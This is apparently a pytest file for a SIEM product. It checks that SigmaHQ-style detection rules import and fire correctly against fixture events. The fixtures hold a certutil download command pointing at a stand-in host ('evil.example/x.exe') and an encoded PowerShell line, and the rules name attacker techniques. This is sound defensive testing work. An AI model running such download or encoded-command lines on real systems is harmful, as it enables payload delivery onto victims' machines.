"""Sigma import end-to-end: realistic SigmaHQ-style rules import AND execute
against a small fixture dataset, producing alert / no-alert correctly.

Covers: process_creation, network_connection, dns_query, authentication;
'contains|all', 'endswith', value lists, 'condition: 1 of selection*',
'and not filter', and the Extra (dynamic JSON column) fallback for fields
that have no dedicated schema column.
"""
from __future__ import annotations

import pytest

from siempl.db import Database, utcnow
from siempl.detect.engine import RuleRunner, RuleStore, sigma_to_rule
from siempl.detect.importer import import_rules

# ---------------------------------------------------------------------------
# Realistic Sigma rules (modeled on SigmaHQ patterns)
# ---------------------------------------------------------------------------

RULE_CERTUTIL = """\
title: Certutil Download With URL Cache
logsource: {category: process_creation, product: windows}
detection:
  sel_img:
    Image|endswith: '\\certutil.exe'
  sel_cli:
    CommandLine|contains|all:
      - '-urlcache'
      - 'http'
  filter:
    CommandLine|contains: 'microsoft.com'
  condition: sel_img and sel_cli and not filter
level: high
tags: [attack.command_and_control, attack.t1105]
"""

RULE_OFFICE_SPAWN_EXTRA = """\
title: Office Spawning Process From Temp Dir
logsource: {category: process_creation, product: windows}
detection:
  sel:
    ParentImage|endswith: '\\winword.exe'
    CurrentDirectory|contains: '\\Temp'
  condition: sel
level: medium
"""

RULE_SUSPICIOUS_NET = """\
title: Outbound Connection To Known Bad IP
logsource: {category: network_connection, product: windows}
detection:
  sel_ip:
    DestinationIp: ['185.220.101.4', '45.155.204.2']
  sel_port:
    DestinationPort: [443, 8443]
  condition: sel_ip and sel_port
level: high
"""

RULE_FAILED_LOGON = """\
title: Failed Remote Logon Type
logsource: {category: authentication, product: windows}
detection:
  sel:
    EventID: 4625
    LogonType: [3, 10]
  condition: sel
level: informational
"""

RULE_ENCODED_PS = """\
title: Encoded PowerShell Command Line
logsource: {category: process_creation, product: windows}
detection:
  selection_enc:
    CommandLine|contains: '-enc '
  selection_ec:
    CommandLine|contains: '-ec '
  selection_b64:
    CommandLine|contains: 'FromBase64String'
  condition: 1 of selection*
level: medium
"""

RULE_DYNDNS = """\
title: DNS Query To Dynamic DNS Provider
logsource: {category: dns_query, product: windows}
detection:
  sel:
    QueryName|endswith: ['.duckdns.org', '.no-ip.com']
  filter:
    QueryName|endswith: '.corp.duckdns.org'
  condition: sel and not filter
level: low
"""

ALL_RULES = [
    RULE_CERTUTIL,
    RULE_OFFICE_SPAWN_EXTRA,
    RULE_SUSPICIOUS_NET,
    RULE_FAILED_LOGON,
    RULE_ENCODED_PS,
    RULE_DYNDNS,
]


@pytest.fixture
def db(tmp_path):
    return Database(str(tmp_path / "t.duckdb"))


def _insert_fixtures(db: Database) -> None:
    """Small fixture dataset: 1 malicious + 1 benign row per rule area.

    TimeGenerated is a naive UTC datetime passed as a parameter (matching
    how the ingest pipeline stores it); DuckDB ``now()`` would cast to the
    session-local wall clock and fall outside the rules' ago() window.
    """
    now = utcnow()
    rows: list[tuple[str, dict]] = [
        # --- certutil: malicious (alert) + benign (filtered by microsoft.com)
        ("ProcessEvents", {
            "ProcessName": "certutil.exe",
            "ProcessPath": "C:\\Windows\\System32\\certutil.exe",
            "ProcessCmdLine": "certutil.exe -urlcache -split -f http://evil.example/x.exe",
            "HostName": "WS01", "UserName": "alice"}),
        ("ProcessEvents", {
            "ProcessName": "certutil.exe",
            "ProcessPath": "C:\\Windows\\System32\\certutil.exe",
            "ProcessCmdLine": "certutil.exe -urlcache -split -f https://microsoft.com/root.cer",
            "HostName": "WS01", "UserName": "alice"}),
        # --- office spawn: malicious row carries CurrentDirectory in Extra
        ("ProcessEvents", {
            "ProcessName": "cmd.exe",
            "ProcessPath": "C:\\Windows\\System32\\cmd.exe",
            "ParentProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            "Extra": '{"CurrentDirectory": "C:\\\\Users\\\\bob\\\\AppData\\\\Local\\\\Temp"}'}),
        # benign office spawn from a normal dir (no Temp in Extra)
        ("ProcessEvents", {
            "ProcessName": "cmd.exe",
            "ProcessPath": "C:\\Windows\\System32\\cmd.exe",
            "ParentProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            "Extra": '{"CurrentDirectory": "C:\\\\Users\\\\bob\\\\Documents"}'}),
        # --- encoded powershell: malicious (-enc) + benign
        ("ProcessEvents", {
            "ProcessName": "powershell.exe",
            "ProcessPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "ProcessCmdLine": "powershell.exe -enc SQBFAFgA"}),
        ("ProcessEvents", {
            "ProcessName": "powershell.exe",
            "ProcessPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "ProcessCmdLine": "powershell.exe Get-ChildItem"}),
        # --- network: bad ip+port (alert), good ip (no alert)
        ("NetworkEvents", {
            "DstIp": "185.220.101.4", "DstPort": 443, "ProcessName": "powershell.exe"}),
        ("NetworkEvents", {
            "DstIp": "8.8.8.8", "DstPort": 443, "ProcessName": "chrome.exe"}),
        # --- dns: dyndns (alert), corp subdomain (filtered)
        ("NetworkEvents", {"DnsQuery": "evil.duckdns.org"}),
        ("NetworkEvents", {"DnsQuery": "host.corp.duckdns.org"}),
        # --- auth: 4625 type 3 (alert), 4624 success (no alert)
        ("AuthEvents", {
            "EventCode": "4625", "EventResult": "failure",
            "UserName": "administrator", "SrcIp": "10.0.0.9",
            "Extra": '{"LogonType": "3"}'}),
        ("AuthEvents", {
            "EventCode": "4624", "EventResult": "success",
            "UserName": "alice", "SrcIp": "10.0.0.5",
            "Extra": '{"LogonType": "3"}'}),
    ]
    for table, cols in rows:
        cols = {"TimeGenerated": now, **cols}
        names = ",".join(cols)
        phs = ",".join("?" * len(cols))
        db.execute(f'INSERT INTO "{table}" ({names}) VALUES ({phs})',
                   list(cols.values()))


def _import_all(db: Database) -> dict[str, str]:
    """Convert + import all rules enabled; return {rule name: rule_id}."""
    rules = [sigma_to_rule(y) for y in ALL_RULES]
    summary = import_rules(db, rules, enable=True)
    assert summary["imported"] == len(ALL_RULES), summary
    assert summary["skipped"] == 0, summary
    store = RuleStore(db)
    return {r["name"]: r["rule_id"] for r in store.list()}


def _alert_count(db: Database, rule_id: str) -> int:
    row = db.query_one(
        "SELECT COUNT(*) AS n FROM alerts WHERE rule_id=?", [rule_id])
    return int(row["n"])


def _evidence_rows(db: Database, rule_id: str) -> int:
    row = db.query_one(
        "SELECT row_count FROM alerts WHERE rule_id=? ORDER BY created_at DESC LIMIT 1",
        [rule_id])
    return int(row["row_count"]) if row else 0


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------

class TestSigmaImports:
    def test_all_six_rules_import(self, db):
        ids = _import_all(db)
        assert len(ids) == 6

    def test_extra_fallback_in_generated_query(self, db):
        rule = sigma_to_rule(RULE_OFFICE_SPAWN_EXTRA, backend="kql")
        assert "tostring(Extra.CurrentDirectory)" in rule["query"]
        rule2 = sigma_to_rule(RULE_FAILED_LOGON, backend="kql")
        assert "tostring(Extra.LogonType)" in rule2["query"]

    def test_unmapped_field_no_longer_raises(self):
        yml = ("title: X\nlogsource: {category: process_creation}\ndetection:\n"
               "  s:\n    SomeRandomField: 'v'\n  condition: s\n")
        rule = sigma_to_rule(yml, backend="kql")  # must not raise
        assert "tostring(Extra.SomeRandomField)" in rule["query"]


class TestSigmaRulesExecute:
    @pytest.fixture(autouse=True)
    def _setup(self, db):
        self.db = db
        _insert_fixtures(db)
        self.ids = _import_all(db)
        self.runner = RuleRunner(db)

    def _run(self, name: str) -> int:
        """Run a rule by display name; return number of alerts for it."""
        rid = self.ids[name]
        self.runner.run_rule(rid)
        return _alert_count(self.db, rid)

    def test_certutil_alerts_and_filter_excludes_benign(self):
        assert self._run("Certutil Download With URL Cache") == 1
        # Only the malicious row matched (benign microsoft.com row filtered)
        assert _evidence_rows(self.db, self.ids["Certutil Download With URL Cache"]) == 1

    def test_office_spawn_via_extra_field(self):
        assert self._run("Office Spawning Process From Temp Dir") == 1
        assert _evidence_rows(self.db, self.ids["Office Spawning Process From Temp Dir"]) == 1

    def test_network_bad_ip_alerts(self):
        assert self._run("Outbound Connection To Known Bad IP") == 1

    def test_failed_logon_alerts(self):
        assert self._run("Failed Remote Logon Type") == 1

    def test_encoded_powershell_one_of_pattern(self):
        assert self._run("Encoded PowerShell Command Line") == 1
        assert _evidence_rows(self.db, self.ids["Encoded PowerShell Command Line"]) == 1

    def test_dyndns_alerts_and_filter_excludes_corp(self):
        assert self._run("DNS Query To Dynamic DNS Provider") == 1
        assert _evidence_rows(self.db, self.ids["DNS Query To Dynamic DNS Provider"]) == 1

    def test_no_alert_rule_stays_quiet(self):
        """A rule that matches nothing must not alert."""
        yml = ("title: Msbuild Abuse\n"
               "logsource: {category: process_creation}\n"
               "detection:\n  s:\n    Image|endswith: '\\msbuild.exe'\n"
               "  condition: s\n")
        summary = import_rules(self.db, [sigma_to_rule(yml)], enable=True)
        assert summary["imported"] == 1
        store = RuleStore(self.db)
        rid = [r for r in store.list() if r["name"] == "Msbuild Abuse"][0]["rule_id"]
        assert self.runner.run_rule(rid) == []
        assert _alert_count(self.db, rid) == 0
